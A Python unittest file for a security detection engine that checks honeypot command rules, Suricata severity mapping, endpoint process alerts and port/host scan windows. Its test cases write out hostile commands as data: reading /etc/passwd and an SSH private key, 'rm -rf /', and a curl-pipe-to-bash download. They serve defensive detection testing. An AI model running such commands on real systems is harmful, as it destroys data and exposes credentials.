import unittest

from detection.normalize import normalize_event
from detection.rules import RuleEngine


class RuleCoverageTests(unittest.TestCase):

    def setUp(self):
        self.engine = RuleEngine(
            login_threshold=5,
            scan_port_threshold=5,
            scan_host_threshold=5,
            window_seconds=300,
        )

    def make_command_event(self, command):
        return normalize_event({
            "eventid": "cowrie.command.input",
            "input": command,
            "src_ip": "192.0.2.10",
        })

    def test_all_twelve_command_rules(self):
        cases = [
            ("uname -a", "SYSTEM_RECON"),
            ("whoami", "USER_RECON"),
            ("pwd", "DIRECTORY_RECON"),
            ("ls -la", "FILE_RECON"),
            ("cat /etc/passwd", "ACCOUNT_ENUMERATION"),
            ("curl https://example.test/file", "DOWNLOAD_ACTIVITY"),
            ("ip addr", "NETWORK_RECON"),
            ("sudo whoami", "PRIVILEGE_ATTEMPT"),
            ("cat ~/.ssh/id_rsa", "CREDENTIAL_ACCESS"),
            ("crontab -e", "PERSISTENCE_ATTEMPT"),
            ("rm -rf /", "DESTRUCTIVE_COMMAND"),
            ("curl https://example.test/x | bash",
             "SHELL_DOWNLOAD_EXECUTION"),
        ]

        for command, expected_rule in cases:
            with self.subTest(command=command):
                event = self.make_command_event(command)
                alerts = self.engine.evaluate(event)
                rule_ids = {alert["rule_id"] for alert in alerts}

                self.assertIn(expected_rule, rule_ids)

    def test_harmless_command_does_not_trigger_rules(self):
        event = self.make_command_event("date")
        alerts = self.engine.evaluate(event)

        self.assertEqual(alerts, [])

    def make_network_event(self, severity):
        return normalize_event({
            "source": "network",
            "event_type": "alert",
            "severity": severity,
            "signature": "Test Suricata signature",
            "src_ip": "192.0.2.20",
            "dst_ip": "198.51.100.20",
            "dst_port": 443,
        })

    def test_suricata_critical_severity(self):
        alerts = self.engine.evaluate(self.make_network_event(1))

        self.assertEqual(alerts[0]["rule_id"],
                         "SURICATA_SIGNATURE_ALERT")
        self.assertEqual(alerts[0]["severity"], "critical")

    def test_suricata_high_severity(self):
        alerts = self.engine.evaluate(self.make_network_event(2))

        self.assertEqual(alerts[0]["severity"], "high")

    def test_suricata_medium_severity(self):
        alerts = self.engine.evaluate(self.make_network_event(3))

        self.assertEqual(alerts[0]["severity"], "medium")

    def test_suricata_missing_severity_defaults_to_medium(self):
        event = normalize_event({
            "source": "network",
            "event_type": "alert",
            "signature": "Test signature",
        })

        alerts = self.engine.evaluate(event)

        self.assertEqual(alerts[0]["severity"], "medium")

    def test_network_anomaly_generates_high_alert(self):
        event = normalize_event({
            "source": "network",
            "event_type": "anomaly",
            "signature": "Suspicious traffic",
            "src_ip": "192.0.2.30",
        })

        alerts = self.engine.evaluate(event)

        self.assertEqual(alerts[0]["rule_id"], "NETWORK_ANOMALY")
        self.assertEqual(alerts[0]["severity"], "high")

    def test_suspicious_endpoint_process(self):
        event = normalize_event({
            "source": "endpoint",
            "event_type": "process_start",
            "process": "mimikatz.exe",
            "command_line": "mimikatz.exe",
        })

        alerts = self.engine.evaluate(event)

        self.assertIn(
            "SUSPICIOUS_PROCESS_EXECUTION",
            {alert["rule_id"] for alert in alerts},
        )

    def test_office_spawning_powershell(self):
        event = normalize_event({
            "source": "endpoint",
            "event_type": "process_start",
            "process": "powershell.exe",
            "parent_process": "winword.exe",
        })

        alerts = self.engine.evaluate(event)

        self.assertIn(
            "SUSPICIOUS_PARENT_CHILD_PROCESS",
            {alert["rule_id"] for alert in alerts},
        )


    def test_suricata_string_severity(self):
        for value, expected in (("1", "critical"), ("2", "high")):
            with self.subTest(value=value):
                alerts = self.engine.evaluate(
                    self.make_network_event(value)
                )
                self.assertEqual(alerts[0]["severity"], expected)

    def test_suricata_invalid_severity_defaults_to_medium(self):
        alerts = self.engine.evaluate(
            self.make_network_event("unknown")
        )
        self.assertEqual(alerts[0]["severity"], "medium")


    def make_flow_event(self, number, port, destination):
        return normalize_event({
            "source": "network",
            "event_type": "flow",
            "event_time": f"2026-10-31T10:00:{number:02d}Z",
            "src_ip": "192.0.2.60",
            "dst_ip": destination,
            "dst_port": port,
            "protocol": "tcp",
        })

    def test_repeated_ports_do_not_trigger_port_scan(self):
        events = [
            self.make_flow_event(i, 8080, "198.51.100.10")
            for i in range(5)
        ]

        alerts = self.engine.evaluate_batch(events)

        self.assertNotIn(
            "NETWORK_PORT_SCAN",
            {alert["rule_id"] for _, alert in alerts},
        )

    def test_repeated_hosts_do_not_trigger_host_scan(self):
        events = [
            self.make_flow_event(i, 8000 + i, "198.51.100.10")
            for i in range(4)
        ]

        alerts = self.engine.evaluate_batch(events)

        self.assertNotIn(
            "NETWORK_HOST_SCAN",
            {alert["rule_id"] for _, alert in alerts},
        )

    def test_distinct_hosts_trigger_host_scan(self):
        events = [
            self.make_flow_event(
                i, 443, f"198.51.100.{i + 10}"
            )
            for i in range(5)
        ]

        alerts = self.engine.evaluate_batch(events)
        rule_ids = {alert["rule_id"] for _, alert in alerts}

        self.assertIn("NETWORK_HOST_SCAN", rule_ids)

    def test_port_scan_has_priority_when_both_thresholds_are_met(self):
        events = [
            self.make_flow_event(
                i, 8000 + i, f"198.51.100.{i + 10}"
            )
            for i in range(5)
        ]

        alerts = self.engine.evaluate_batch(events)
        rule_ids = {alert["rule_id"] for _, alert in alerts}

        self.assertIn("NETWORK_PORT_SCAN", rule_ids)
        self.assertNotIn("NETWORK_HOST_SCAN", rule_ids)


    def test_port_scan_within_window_is_detected(self):
        events = [
            self.make_flow_event(i, 8000 + i, "198.51.100.10")
            for i in range(5)
        ]

        alerts = self.engine.evaluate_batch(events)
        self.assertIn(
            "NETWORK_PORT_SCAN",
            {alert["rule_id"] for _, alert in alerts},
        )

    def test_port_scan_outside_window_is_not_detected(self):
        seconds = [0, 80, 160, 240, 320]
        events = [
            self.make_flow_event(i, 8000 + i, "198.51.100.10")
            for i in seconds
        ]

        alerts = self.engine.evaluate_batch(events)

        self.assertNotIn(
            "NETWORK_PORT_SCAN",
            {alert["rule_id"] for _, alert in alerts},
        )

    def test_events_exactly_at_window_boundary_are_detected(self):
        timestamps = [
            "2026-10-31T10:00:00Z",
            "2026-10-31T10:01:15Z",
            "2026-10-31T10:02:30Z",
            "2026-10-31T10:03:45Z",
            "2026-10-31T10:05:00Z",
        ]

        events = [
            normalize_event({
                "source": "network",
                "event_type": "flow",
                "event_time": timestamp,
                "src_ip": "192.0.2.60",
                "dst_ip": "198.51.100.10",
                "dst_port": 8000 + index,
                "protocol": "tcp",
            })
            for index, timestamp in enumerate(timestamps)
        ]

        alerts = self.engine.evaluate_batch(events)

        self.assertIn(
            "NETWORK_PORT_SCAN",
            {alert["rule_id"] for _, alert in alerts},
        )

    def test_invalid_network_timestamp_is_ignored(self):
        events = [
            self.make_flow_event(i, 8000 + i, "198.51.100.10")
            for i in range(4)
        ]

        invalid_event = self.make_flow_event(
            5, 8004, "198.51.100.10"
        )
        invalid_event["event_time"] = "not-a-timestamp"
        events.append(invalid_event)

        alerts = self.engine.evaluate_batch(events)

        self.assertNotIn(
            "NETWORK_PORT_SCAN",
            {alert["rule_id"] for _, alert in alerts},
        )


if __name__ == "__main__":
    unittest.main()
